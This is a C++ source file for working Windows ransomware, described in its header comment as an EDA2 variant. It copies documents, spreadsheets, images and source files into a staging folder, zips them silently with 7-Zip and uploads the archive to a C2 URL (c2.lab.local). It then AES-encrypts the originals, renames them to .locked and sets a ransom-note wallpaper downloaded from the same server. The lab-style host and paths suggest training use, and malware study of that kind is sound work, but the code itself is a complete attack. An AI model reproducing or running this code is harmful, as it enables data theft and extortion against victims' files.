// EDA2 variant with exfil of files to C2 server prior to encryption
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <algorithm>
#include <random>
#include <filesystem>
#include <windows.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

namespace fs = std::filesystem;

class Form1
{
private:
    std::string aes_key;
    std::string userName;
    std::string computerName;
    std::string userDir = "C:\\Users\\";
    std::string backgroundImageUrl = "http://c2.lab.local/panel/ransomnote";
    std::string exfilUploadUrl = "http://c2.lab.local/panel/exfil";
    std::string stagingDir = "C:\\Users\\Public\\A01_5_Staging";
    std::string archivePath = "C:\\Users\\Public\\A01_5_Exfil.7z";
    std::string sevenZipPath = "C:\\Program Files\\7-Zip\\7z.exe";
    std::vector<std::string> validExtensions = {
        ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln",
        ".php", ".asp", ".aspx", ".html", ".xml", ".psd"};

    std::string get_env_var(const std::string &key)
    {
        char *buf = nullptr;
        size_t sz = 0;
        if (_dupenv_s(&buf, &sz, key.c_str()) == 0 && buf != nullptr)
        {
            std::string res(buf);
            free(buf);
            return res;
        }
        return "";
    }

    std::string get_computer_name()
    {
        char buffer[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(buffer);
        if (GetComputerNameA(buffer, &size))
        {
            return std::string(buffer);
        }
        return "";
    }

public:
    Form1()
    {
        userName = get_env_var("USERNAME");
        computerName = get_computer_name();
    }

    void startAction()
    {
        std::string dataPath = "C:\\Users\\Public\\A01_TestData";

        aes_key = GenerateKey(32);

        std::string keyPath = "C:\\Users\\Public\\A01_5_Lab_Encryption_Key.txt";
        std::ofstream keyFile(keyPath);
        if (keyFile.is_open())
        {
            keyFile << aes_key;
            keyFile.close();
        }

        if (fs::exists(dataPath) && fs::is_directory(dataPath))
        {
            StageFilesForExfil(dataPath, stagingDir);
            CompressStagingDirectory();
            ExfilArchive(exfilUploadUrl);

            EncryptDirectory(dataPath, aes_key);
        }

        aes_key = "";

        std::string backgroundImageName = userDir + userName + "\\ransom.jpg";
        SetWallpaperFromWeb(backgroundImageUrl, backgroundImageName);
    }

    void EncryptFile(const std::string &file, const std::string &key)
    {
        std::string lowerFile = file;
        std::transform(lowerFile.begin(), lowerFile.end(), lowerFile.begin(), ::tolower);
        if (lowerFile.size() >= 7 && lowerFile.substr(lowerFile.size() - 7) == ".locked")
        {
            return;
        }

        std::ifstream is(file, std::ios::binary);
        if (!is)
            return;
        std::vector<unsigned char> bytesToBeEncrypted((std::istreambuf_iterator<char>(is)), std::istreambuf_iterator<char>());
        is.close();

        std::vector<unsigned char> bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, key);

        std::ofstream os(file, std::ios::binary);
        if (!os)
            return;
        os.write((const char *)bytesEncrypted.data(), bytesEncrypted.size());
        os.close();

        fs::rename(file, file + ".locked");
    }

    void EncryptDirectory(const std::string &location, const std::string &key)
    {
        try
        {
            for (const auto &entry : fs::directory_iterator(location))
            {
                if (fs::is_regular_file(entry.path()))
                {
                    std::string ext = entry.path().extension().string();
                    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

                    bool isValid = false;
                    for (const auto &vExt : validExtensions)
                    {
                        if (ext == vExt)
                        {
                            isValid = true;
                            break;
                        }
                    }

                    if (isValid)
                    {
                        try
                        {
                            EncryptFile(entry.path().string(), key);
                        }
                        catch (...)
                        {
                        }
                    }
                }
                else if (fs::is_directory(entry.path()))
                {
                    try
                    {
                        EncryptDirectory(entry.path().string(), key);
                    }
                    catch (...)
                    {
                    }
                }
            }
        }
        catch (...)
        {
        }
    }

    std::vector<unsigned char> AES_Encrypt(
        const std::vector<unsigned char> &bytesToBeEncrypted,
        const std::string &keyMaterial)
    {
        std::vector<unsigned char> encrypted;

        HCRYPTPROV hProv = 0;
        HCRYPTHASH hHash = 0;
        HCRYPTKEY hKey = 0;

        if (!CryptAcquireContextA(
                &hProv,
                NULL,
                NULL,
                PROV_RSA_AES,
                CRYPT_VERIFYCONTEXT))
        {
            return encrypted;
        }

        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
        {
            CryptReleaseContext(hProv, 0);
            return encrypted;
        }

        if (!CryptHashData(
                hHash,
                reinterpret_cast<const BYTE *>(keyMaterial.data()),
                static_cast<DWORD>(keyMaterial.size()),
                0))
        {
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return encrypted;
        }

        if (!CryptDeriveKey(
                hProv,
                CALG_AES_256,
                hHash,
                0,
                &hKey))
        {
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return encrypted;
        }

        DWORD mode = CRYPT_MODE_CBC;
        CryptSetKeyParam(hKey, KP_MODE, reinterpret_cast<BYTE *>(&mode), 0);

        BYTE iv[16] = {0};
        CryptSetKeyParam(hKey, KP_IV, iv, 0);

        encrypted = bytesToBeEncrypted;

        DWORD dataLen = static_cast<DWORD>(encrypted.size());
        DWORD bufferLen = dataLen + 16;
        encrypted.resize(bufferLen);

        if (!CryptEncrypt(
                hKey,
                0,
                TRUE,
                0,
                encrypted.data(),
                &dataLen,
                bufferLen))
        {
            encrypted.clear();
        }
        else
        {
            encrypted.resize(dataLen);
        }

        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);

        return encrypted;
    }

    std::string GenerateKey(int length)
    {
        const std::string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
        std::string res = "";
        std::random_device rd;
        std::mt19937 generator(rd());
        std::uniform_int_distribution<int> distribution(0, (int)valid.length() - 1);

        while (0 < length--)
        {
            res += valid[distribution(generator)];
        }
        return res;
    }

    void SetWallpaper(const std::string &path)
    {
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void *)path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    }

    void SetWallpaperFromWeb(const std::string &url, const std::string &path)
    {
        std::wstring wideUrl(url.begin(), url.end());

        URL_COMPONENTS urlComp;
        ZeroMemory(&urlComp, sizeof(urlComp));
        urlComp.dwStructSize = sizeof(urlComp);

        wchar_t hostName[256];
        wchar_t urlPath[1024];

        urlComp.lpszHostName = hostName;
        urlComp.dwHostNameLength = 256;

        urlComp.lpszUrlPath = urlPath;
        urlComp.dwUrlPathLength = 1024;

        if (!WinHttpCrackUrl(wideUrl.c_str(), 0, 0, &urlComp))
        {
            return;
        }

        std::wstring host(hostName, urlComp.dwHostNameLength);
        std::wstring uriPath(urlPath, urlComp.dwUrlPathLength);

        HINTERNET hSession = WinHttpOpen(
            L"Mozilla/5.0",
            WINHTTP_ACCESS_TYPE_NO_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);

        if (!hSession)
            return;

        HINTERNET hConnect = WinHttpConnect(
            hSession,
            host.c_str(),
            urlComp.nPort,
            0);

        if (!hConnect)
        {
            WinHttpCloseHandle(hSession);
            return;
        }

        HINTERNET hRequest = WinHttpOpenRequest(
            hConnect,
            L"GET",
            uriPath.c_str(),
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);

        if (!hRequest)
        {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return;
        }

        BOOL sent = WinHttpSendRequest(
            hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            WINHTTP_NO_REQUEST_DATA,
            0,
            0,
            0);

        if (sent && WinHttpReceiveResponse(hRequest, NULL))
        {
            std::ofstream os(path, std::ios::binary);

            if (os.is_open())
            {
                DWORD bytesAvailable = 0;

                do
                {
                    bytesAvailable = 0;

                    if (!WinHttpQueryDataAvailable(hRequest, &bytesAvailable))
                        break;

                    if (bytesAvailable == 0)
                        break;

                    std::vector<char> buffer(bytesAvailable);
                    DWORD bytesRead = 0;

                    if (!WinHttpReadData(
                            hRequest,
                            buffer.data(),
                            bytesAvailable,
                            &bytesRead))
                    {
                        break;
                    }

                    os.write(buffer.data(), bytesRead);

                } while (bytesAvailable > 0);

                os.close();
            }
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        if (fs::exists(path))
        {
            SetWallpaper(path);
        }
    }

    void StageFilesForExfil(const std::string &sourceDir, const std::string &stageDir)
    {
        if (fs::exists(stageDir))
        {
            fs::remove_all(stageDir);
        }

        fs::create_directories(stageDir);

        try
        {
            for (const auto &entry : fs::recursive_directory_iterator(sourceDir))
            {
                if (fs::is_regular_file(entry.path()))
                {
                    std::string ext = entry.path().extension().string();
                    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

                    bool isValid = false;
                    for (const auto &vExt : validExtensions)
                    {
                        if (ext == vExt)
                        {
                            isValid = true;
                            break;
                        }
                    }

                    if (!isValid)
                        continue;

                    try
                    {
                        fs::path relPath = fs::relative(entry.path(), sourceDir);
                        fs::path stagedPath = fs::path(stageDir) / relPath;

                        fs::create_directories(stagedPath.parent_path());
                        fs::copy_file(entry.path(), stagedPath, fs::copy_options::overwrite_existing);
                    }
                    catch (...)
                    {
                    }
                }
            }
        }
        catch (...)
        {
        }
    }

    void CompressStagingDirectory()
    {
        if (!fs::exists(sevenZipPath))
        {
            return;
        }

        if (fs::exists(archivePath))
        {
            fs::remove(archivePath);
        }

        std::string args = "a -t7z \"" + archivePath + "\" \"" + stagingDir + "\\*\" -y";

        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        ZeroMemory(&pi, sizeof(pi));

        std::string cmd = "\"" + sevenZipPath + "\" " + args;
        char *cmdLine = _strdup(cmd.c_str());

        if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        {
            WaitForSingleObject(pi.hProcess, INFINITE);

            DWORD exitCode;
            GetExitCodeProcess(pi.hProcess, &exitCode);

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            free(cmdLine);

            if (exitCode != 0 || !fs::exists(archivePath))
            {
                return;
            }
        }
        else
        {
            free(cmdLine);
        }
    }

    void ExfilArchive(const std::string &url)
    {
        if (!fs::exists(archivePath))
            return;

        std::ifstream file(archivePath, std::ios::binary);
        if (!file)
            return;

        std::vector<char> fileBytes(
            (std::istreambuf_iterator<char>(file)),
            std::istreambuf_iterator<char>());
        file.close();

        std::wstring wideUrl(url.begin(), url.end());

        URL_COMPONENTS urlComp;
        ZeroMemory(&urlComp, sizeof(urlComp));
        urlComp.dwStructSize = sizeof(urlComp);

        wchar_t hostName[256];
        wchar_t urlPath[1024];

        urlComp.lpszHostName = hostName;
        urlComp.dwHostNameLength = 256;

        urlComp.lpszUrlPath = urlPath;
        urlComp.dwUrlPathLength = 1024;

        if (!WinHttpCrackUrl(wideUrl.c_str(), 0, 0, &urlComp))
        {
            return;
        }

        std::wstring host(hostName, urlComp.dwHostNameLength);
        std::wstring path(urlPath, urlComp.dwUrlPathLength);
        INTERNET_PORT port = urlComp.nPort;

        std::string boundary = "----A01_5_BOUNDARY_7Z_UPLOAD";

        std::string headerPart =
            "--" + boundary + "\r\n"
                              "Content-Disposition: form-data; name=\"file\"; filename=\"A01_5_Exfil.7z\"\r\n"
                              "Content-Type: application/octet-stream\r\n\r\n";

        std::string footerPart =
            "\r\n--" + boundary + "--\r\n";

        std::vector<char> postBody;
        postBody.insert(postBody.end(), headerPart.begin(), headerPart.end());
        postBody.insert(postBody.end(), fileBytes.begin(), fileBytes.end());
        postBody.insert(postBody.end(), footerPart.begin(), footerPart.end());

        std::wstring headers =
            L"Content-Type: multipart/form-data; boundary=" +
            std::wstring(boundary.begin(), boundary.end()) +
            L"\r\n";

        HINTERNET hSession = WinHttpOpen(
            L"Mozilla/5.0",
            WINHTTP_ACCESS_TYPE_NO_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);

        if (!hSession)
            return;

        HINTERNET hConnect = WinHttpConnect(
            hSession,
            host.c_str(),
            port,
            0);

        if (!hConnect)
        {
            WinHttpCloseHandle(hSession);
            return;
        }

        HINTERNET hRequest = WinHttpOpenRequest(
            hConnect,
            L"POST",
            path.c_str(),
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);

        if (!hRequest)
        {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return;
        }

        BOOL sent = WinHttpSendRequest(
            hRequest,
            headers.c_str(),
            static_cast<DWORD>(headers.length()),
            postBody.data(),
            static_cast<DWORD>(postBody.size()),
            static_cast<DWORD>(postBody.size()),
            0);

        if (sent)
        {
            WinHttpReceiveResponse(hRequest, NULL);
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        if (fs::exists(stagingDir))
        {
            fs::remove_all(stagingDir);
        }

        if (fs::exists(archivePath))
        {
            fs::remove(archivePath);
        }
    }
};

int main()
{
    Form1 app;
    app.startAction();
    return 0;
}
